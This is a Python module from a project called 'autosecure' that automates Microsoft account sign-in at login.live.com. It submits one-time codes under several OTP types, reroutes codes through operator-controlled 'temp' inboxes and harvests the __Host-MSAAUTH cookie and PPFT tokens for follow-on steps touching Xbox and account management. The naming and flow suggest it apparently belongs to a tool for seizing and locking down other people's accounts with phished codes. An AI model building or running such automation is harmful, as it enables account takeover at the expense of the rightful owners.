"""Microsoft login flow (OTP / authenticator) for autosecure.

Returns a session that carries ``__Host-MSAAUTH`` plus the ``urlPost`` / ``ppft``
tokens needed for the subsequent login posts.
"""
from securing.auth.handle_redirects import handle_redirects, get_data
from securing.auth.account_status import get_account_lock_reason
from securing.utils.cookies.safe_cookies import (
    dedupe_cookies,
    has_cookie,
)
from mail.settings import is_our_inbox
from urllib.parse import quote
import json
import logging
import httpx
import re

_LOGIN_TIMEOUT = httpx.Timeout(25.0, connect=10.0)

# Cached because this only changes when the process restarts.
_config_login_email: str | None = None


async def get_msaauth(session, email, flowtoken, odata, code, ppft=None):
    # First post request that gets __Host-MSAAUTH

    if not code:
        loginData = await session.post(
            url=odata["urlPost"],
            headers={
                "host": "login.live.com",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0, i",
            },
            data={
                "login": email,
                "loginfmt": email,
                "slk": flowtoken,
                "psRNGCSLK": flowtoken,
                "type": "21",
                "PPFT": odata["ppft"],
            },
            follow_redirects=True,
            timeout=_LOGIN_TIMEOUT,
        )

        urlPost = re.search(r'"urlPost"\s*:\s*"([^"]+)"', loginData.text)

    else:
        payload = {
            "login": email,
            "loginfmt": email,
            "SentProofIDE": flowtoken,
            "PPFT": odata["ppft"],
        }

        for i in range(2):
            # Temp-email/code flow: when a code is supplied, the account may only
            # accept login via the temp mailbox + OTP. MS rejects the main email
            # and password directly (400/identity error), so we first POST the
            # temp email without a code to reach the OTP page, resend the code
            # there, and only then submit the 6-digit code.
            if code and not _usable_login_email(email):
                temp_result = await _handle_temp_otp_login(
                    session, odata, email, flowtoken, code, odata.get("ppft", ""),
                )
                if temp_result:
                    return temp_result

            # 1 - Normal Email OTP (Type 24)
            # 2 - Primary Email working as Security Email too (Type 27)
            # 3 - Phone Number
            match i:
                case 0:
                    payload["otc"] = code
                    payload["type"] = "27"
                case 1:
                    payload.pop("otc")
                    payload["npotc"] = code
                    payload["type"] = "24"

            loginData = await session.post(
                url=odata["urlPost"],
                headers={
                    "host": "login.live.com",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://login.live.com",
                    "Referer": "https://login.live.com/",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Priority": "u=0, i",
                },
                data=payload,
                follow_redirects=True,
                timeout=_LOGIN_TIMEOUT,
            )

            print(f"[~] - Login attempt {i + 1}/2 status={loginData.status_code} len={len(loginData.text or '')}", flush=True)
            logging.info(
                "Login attempt %s status=%s bytes=%s",
                i + 1,
                loginData.status_code,
                len(loginData.text or ""),
            )
            urlPost = re.search(r'"urlPost"\s*:\s*"([^"]+)"', loginData.text)
            dedupe_cookies(session)
            if has_cookie(session, "__Host-MSAAUTH"):
                break

            # If we landed on the OTP page for the wrong email (code was for the temp
            # mailbox), resend code to the temp email instead of the main one.
            if code and not _usable_login_email(email):
                temp_email = _usable_temp_login(email)
                if temp_email:
                    print(f"[~] - Retrying code submit to {temp_email}", flush=True)
                    payload.pop("otc", None)
                    payload["login"] = temp_email
                    payload["loginfmt"] = temp_email
                    payload["npotc"] = code
                    payload["type"] = "24"
                    loginData = await session.post(
                        url=odata["urlPost"],
                        headers={
                            "host": "login.live.com",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Origin": "https://login.live.com",
                            "Referer": "https://login.live.com/",
                            "Sec-Fetch-Dest": "document",
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-Site": "same-origin",
                            "Priority": "u=0, i",
                        },
                        data=payload,
                        follow_redirects=True,
                        timeout=_LOGIN_TIMEOUT,
                    )
                    print(f"[~] - Retry login attempt {i + 1}/2 (temp) status={loginData.status_code} len={len(loginData.text or '')}", flush=True)
                    logging.info(
                        "Login attempt (temp) %s status=%s bytes=%s",
                        i + 1,
                        loginData.status_code,
                        len(loginData.text or ""),
                    )
                    urlPost = re.search(r'"urlPost"\s*:\s*"([^"]+)"', loginData.text)
                    dedupe_cookies(session)
                    if has_cookie(session, "__Host-MSAAUTH"):
                        break

            dedupe_cookies(session)

    dedupe_cookies(session)
    if has_cookie(session, "__Host-MSAAUTH"):
        logging.info("MSAAUTH cookie present for %s", email)

        if not urlPost:
            data = await handle_redirects(session, loginData.text)
            if data == "Family":
                return "Family"
            if isinstance(data, dict) and data.get("urlPost"):
                return data
            parsed = get_data(loginData.text)
            if parsed:
                return parsed
            if isinstance(data, str):
                parsed = get_data(data)
                if parsed:
                    return parsed
                # Privacy/identity continue may leave a page with ServerData tokens
                sft_m = re.search(r'"sFT"\s*:\s*"([^"]+)"', data)
                post_m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', data)
                if sft_m and post_m:
                    return {
                        "urlPost": post_m.group(1),
                        "ppft": quote(sft_m.group(1), safe="-*"),
                    }

        sft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', loginData.text)
        if not sft_match:
            data = await handle_redirects(session, loginData.text)
            if isinstance(data, dict) and data.get("urlPost"):
                return data
            if isinstance(data, dict) and data.get("_cookies_only"):
                return data
            # Prefer real OTP/login errors over HTML lock false-positives
            err = re.search(r'"sErrTxt"\s*:\s*"((?:\.|[^"])*)"', loginData.text)
            if err:
                txt = re.sub(r"<[^>]+>", "", err.group(1)).replace('\\"', '"')
                if txt.strip():
                    return {"_error": txt.strip()[:200]}
            lock_reason = await get_account_lock_reason(email, None)
            if lock_reason:
                return {"_error": lock_reason}
            logging.warning(
                "MSAAUTH present for %s but no sFT — cookies-only polish",
                email,
            )
            return {"_cookies_only": True}

        ppft = quote(sft_match.group(1), safe="-*")

        return {
            "urlPost": urlPost.group(1),
            "ppft": ppft,
        }

    # Prefer explicit login error text over HTML lock heuristics
    err = re.search(r'"sErrTxt"\s*:\s*"((?:\.|[^"])*)"', loginData.text)
    if err:
        txt = re.sub(r"<[^>]+>", "", err.group(1)).replace('\\"', '"').strip()
        if txt:
            return {"_error": txt[:200]}

    lock_reason = await get_account_lock_reason(email, loginData.text)
    if lock_reason:
        return {"_error": lock_reason}
    return {"_error": "Login failed — no MSAAUTH cookie (wrong/expired OTP or Microsoft rejected login)."}


def _fresh_login_tokens(html: str | None) -> dict | None:
    """urlPost + quoted sFT from a login page's ServerData.

    The OTP page's urlPost/PPFT are consumed by the code post, so the login
    finish (polish / type=28) has to use the tokens the *response* carries.
    Re-posting the pre-login pair 302s back to the sign-in page: no SSO
    redirect, no WLSSC, and get_t/AMC/Xbox all fail on the i5030 page.
    """
    if not html:
        return None
    post_m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
    sft_m = re.search(r'"sFT"\s*:\s*"([^"]+)"', html)
    if not (post_m and sft_m):
        return None
    return {"urlPost": post_m.group(1), "ppft": quote(sft_m.group(1), safe="-*")}


def _usable_login_email(email):
    """True when this email is a primary login we post to directly."""
    if not email or "@" not in email:
        return False
    return email.startswith("sunny") or is_our_inbox(email)


def _config_otp_login() -> str:
    """Fallback login address, from ``mail.otp_login_email`` in config/config.json.

    Kept in the (gitignored) config file rather than hard-coded here so a shared or
    published copy of this project does not carry anyone's personal address.
    """
    global _config_login_email
    if _config_login_email is None:
        try:
            with open("config/config.json", encoding="utf-8") as fh:
                mail = json.load(fh).get("mail") or {}
            _config_login_email = str(mail.get("otp_login_email") or "").strip()
        except Exception:
            logging.getLogger("bot").warning(
                "get_msaauth: could not read mail.otp_login_email", exc_info=True
            )
            _config_login_email = ""
    return _config_login_email


def _usable_temp_login(email):
    """Return the temp mailbox login we can POST to reach the OTP page."""
    if email and _usable_login_email(email):
        return email
    # Fallback to the configured address, else the account email itself.
    return _config_otp_login() or email


async def _handle_temp_otp_login(
    session, odata, email, flowtoken, code, ppft,
):
    """Alternate path for the temp-email/code flow.

    MS rejects the main login when the account only accepts OTP to a temp
    mailbox. We POST the temp mailbox (no code) to reach the OTP page, then
    submit the 6-digit code from that mailbox.
    """
    # 1) POST temp email (no code) to reach the OTP page
    print(f"[~] - Temp-email flow: POST {email} to reach OTP page", flush=True)
    try:
        reached = await session.post(
            url=odata["urlPost"],
            headers={
                "host": "login.live.com",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0, i",
            },
            data={
                "login": email,
                "loginfmt": email,
                "slk": flowtoken,
                "psRNGCSLK": flowtoken,
                "type": "21",
                "PPFT": ppft if ppft else odata["ppft"],
            },
            follow_redirects=True,
            timeout=_LOGIN_TIMEOUT,
        )
        if reached.status_code >= 400:
            return None
    except Exception:
        logging.exception("temp-email pre-login POST failed")
        return None

    temp_url_post = re.search(r'"urlPost"\s*:\s*"([^"]+)"', reached.text or "")
    if not temp_url_post:
        return None

    # 2) Submit code to the TEMP mailbox
    print("[+] - Temp email reached OTP page — submitting code", flush=True)
    payload = {
        "login": email,
        "loginfmt": email,
        "otc": code,
        "type": "27",
        "PPFT": ppft if ppft else odata["ppft"],
        "SentProofIDE": flowtoken,
    }
    try:
        login_resp = await session.post(
            url=temp_url_post.group(1),
            headers={
                "host": "login.live.com",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0, i",
            },
            data=payload,
            follow_redirects=True,
            timeout=_LOGIN_TIMEOUT,
        )
    except Exception:
        logging.exception("temp-email code POST failed")
        return None

    # Tokens from the code response are the live ones — the OTP page's pair was
    # consumed by the POST above.
    fresh = _fresh_login_tokens(login_resp.text) or _fresh_login_tokens(reached.text)

    if has_cookie(session, "__Host-MSAAUTH"):
        if fresh:
            return fresh
        return {"urlPost": temp_url_post.group(1), "ppft": ppft or odata.get("ppft", "")}

    # Fall back to normal handle_redirects path
    data = await handle_redirects(session, login_resp.text)
    if isinstance(data, dict) and data.get("urlPost"):
        return data
    if isinstance(data, dict) and data.get("_cookies_only"):
        return data
    return fresh
